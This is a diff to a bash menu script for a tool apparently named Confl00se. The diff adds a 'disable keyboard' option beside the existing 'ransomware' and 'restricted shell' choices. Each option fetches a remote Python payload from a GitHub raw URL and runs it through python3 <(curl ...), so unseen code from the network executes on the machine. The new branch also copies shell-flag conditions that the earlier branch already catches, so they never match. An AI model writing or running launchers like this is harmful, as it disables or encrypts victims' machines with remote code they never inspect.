@@ -8,7 +8,9 @@ function gui() {
     echo "-------"
     echo -e "\033[0;31m[0]\033[0m ransomware"
     echo -e "\033[0;31m[1]\033[0m restricted shell"
-    echo -e "\033[0;31m[2]\033[0m exit"
+    echo -e "\033[0;31m[2]\033[0m disable keyboard"
+    echo -e "\033[0;31m[3]\033[0m exit"
+
     echo "-------"
     read -p $'\033[1;35mHow do you want to confloose? \033[0m' choice
     confloose "$choice"
@@ -21,7 +23,10 @@ function confloose() {
     elif [ "$1" == "1" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
         # restricted_shell
         python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/src/restricted_shell.py")
-    elif [ "$1" == "2" ]; then
+    elif [ "$1" == "2" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
+         # onlymouse
+         python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/src/onlymouse.py")
+    elif [ "$1" == "3" ]; then
         exit
     else
         echo -e "\033[0;31mInvalid arg\033[0m"
